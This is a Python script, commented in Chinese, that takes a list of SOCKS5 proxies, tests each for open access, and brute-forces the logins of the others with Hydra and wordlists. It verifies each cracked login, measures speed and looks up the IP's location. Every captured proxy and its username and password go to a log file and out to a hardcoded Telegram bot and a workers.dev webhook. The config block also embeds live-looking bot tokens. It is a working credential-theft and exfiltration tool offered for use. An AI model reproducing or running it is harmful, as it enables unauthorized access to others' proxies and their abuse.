import subprocess
import requests
import time
import socket
import socks
import re
import os
from datetime import datetime

# ================= 配置区域 =================
TG_BOT_TOKEN = "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY"
TG_CHAT_ID = "6977085303"
WEBHOOK_URL = "https://wepush.yhe8714.workers.dev/wxsend"
WEBHOOK_AUTH = "hy248624"

SOCKS_FILE = "/root/s5/socks.txt"
USER_FILE = "/root/s5/users.txt"
PASS_FILE = "/root/s5/pass.txt"
LOG_FILE = "/root/s5/success_proxies.log"
STATUS_FILE = "/root/s5/monitor.status"
# ===========================================

def update_status(message):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{now}] {message}"
    print(full_msg)
    try:
        with open(STATUS_FILE, "w", encoding="utf-8") as f:
            f.write(full_msg)
    except:
        pass

def send_webhook(title, content):
    if not WEBHOOK_URL: return
    headers = {"Authorization": WEBHOOK_AUTH, "Content-Type": "application/json"}
    payload = {
        "title": title,
        "content": content,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        requests.post(WEBHOOK_URL, headers=headers, json=payload, timeout=10)
    except:
        pass

def send_telegram(message):
    if not TG_BOT_TOKEN or not TG_CHAT_ID: return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def get_ip_info(ip):
    """获取详细归属地信息"""
    try:
        url = f"http://ip-api.com/json/{ip}?lang=zh-CN"
        r = requests.get(url, timeout=5).json()
        if r['status'] == 'success':
            return {
                "country": r.get('country', '未知'),
                "region": r.get('regionName', ''),
                "city": r.get('city', ''),
                "isp": r.get('isp', '未知')
            }
    except:
        pass
    return {"country": "未知", "region": "", "city": "", "isp": "未知"}

def check_no_auth(ip, port):
    """探测无密模式"""
    update_status(f"探测无密模式: {ip}:{port} ...")
    origin_sock = socket.socket
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
        requests.get("http://www.microsoft.com", timeout=3)
        return True
    except:
        return False
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def verify_login(ip, port, user, password):
    """二次验证：防止 Hydra 误报"""
    origin_sock = socket.socket
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        s.settimeout(5)
        s.connect(("8.8.8.8", 53)) # 尝试连接 DNS 端口进行握手验证
        s.close()
        return True
    except:
        return False
    finally:
        socket.socket = origin_sock

def test_proxy_speed(ip, port, user, password):
    update_status(f"正在测速: {ip}:{port} ...")
    origin_sock = socket.socket
    start = time.time()
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        socket.socket = socks.socksocket
        
        # 测延迟
        requests.get("http://www.microsoft.com", timeout=5)
        latency = (time.time() - start) * 1000
        
        # 测下载
        dl_start = time.time()
        requests.get("https://speed.cloudflare.com/__down?bytes=500000", timeout=10)
        speed = 500 / (time.time() - dl_start)
        return latency, speed
    except:
        return None, None
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def format_speed(s):
    if s is None: return "N/A"
    if s > 5000: return f"{s:.2f} kb/s(起飞)"
    if s > 2000: return f"{s:.2f} kb/s(极快)"
    if s > 500: return f"{s:.2f} kb/s(流畅)"
    return f"{s:.2f} kb/s(一般)"

def run_hydra(ip, port):
    update_status(f"Hydra 正在爆破: {ip}:{port} ...")
    cmd = [
        "hydra", "-L", USER_FILE, "-P", PASS_FILE, "-s", port,
        "-t", "4", "-w", "1", "-f", "-I", f"socks5://{ip}"
    ]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", res.stdout)
        if match: return match.group(1), match.group(2), "Success"
        return None, None, "未找到"
    except Exception as e:
        return None, None, str(e)

def main():
    if not os.path.exists(SOCKS_FILE): return

    with open(SOCKS_FILE, 'r') as f:
        targets = [l.strip() for l in f if l.strip() and ":" in l]

    total = len(targets)
    update_status(f"任务启动: {total} 个目标")

    for idx, target in enumerate(targets):
        ip, port = target.split(":")
        current_num = idx + 1
        progress_percent = (current_num / total) * 100
        
        # 1. 无密检测
        is_no_auth = check_no_auth(ip, port)
        user, pwd = (None, None)
        
        if not is_no_auth:
            # 2. Hydra 爆破
            user, pwd, reason = run_hydra(ip, port)
        
        # 3. 结果处理
        if is_no_auth or (user and pwd):
            # 二次验证（仅针对有密码情况）
            if not is_no_auth:
                update_status(f"正在二次验证: {user}:{pwd} ...")
                if not verify_login(ip, port, user, pwd):
                    update_status(f"⚠️ 丢弃: {ip}:{port} (Hydra误报)")
                    time.sleep(2)
                    continue
            
            # 显示用变量
            show_u = user if user else "无"
            show_p = pwd if pwd else "无"
            
            # 测速
            lat, speed = test_proxy_speed(ip, port, user, pwd)
            
            if lat is None:
                update_status(f"❌ 假死: {ip}:{port} [账号:{show_u} 密码:{show_p}]")
            else:
                # 成功！获取信息并发送
                info = get_ip_info(ip)
                
                # 构造链接
                if user:
                    link_full = f"socks5://{user}:{pwd}@{ip}:{port}"
                    tg_link_url = f"https://t.me/socks?server={ip}&port={port}&user={user}&pass={pwd}"
                else:
                    link_full = f"socks5://{ip}:{port}"
                    tg_link_url = f"https://t.me/socks?server={ip}&port={port}"
                
                # 格式化数据
                lat_str = f"{lat:.2f} ms"
                speed_str = format_speed(speed)
                
                # ==========================================
                # 【关键修改】按照你的要求定制的消息格式
                # ==========================================
                tg_msg = (
                    f"<b>【获取到socks5】</b>\n"
                    f"IP：<code>{ip}</code>\n"
                    f"端口：<code>{port}</code>\n"
                    f"账号：<code>{show_u}</code>\n"
                    f"密码：<code>{show_p}</code>\n\n"
                    f"<code>{link_full}</code>\n\n"
                    f"<a href='{tg_link_url}'>TG一键连接链接</a>\n"
                    f"延迟: {lat_str} | 下载速度: {speed_str}\n"
                    f"进度: {current_num}/{total} ({progress_percent:.1f}%)\n"
                    f"【归属地：{info['country']} {info['region']} {info['city']}】-【运营商：{info['isp']}】"
                )
                
                # Webhook 内容 (纯文本，给手机推送看摘要)
                webhook_content = (
                    f"节点: {link_full}\n"
                    f"延迟: {lat_str} | 速度: {speed_str}\n"
                    f"地区: {info['country']} {info['isp']}"
                )
                
                # 写入文件
                with open(LOG_FILE, "a") as f: f.write(link_full + "\n")
                
                update_status(f"✅ 成功: {ip}:{port}")
                send_telegram(tg_msg)
                send_webhook(f"捕获SOCKS5: {ip}", webhook_content)

        else:
            update_status(f"⛔️ 失败: {ip}:{port}")

        time.sleep(2)

if __name__ == "__main__":
    main()
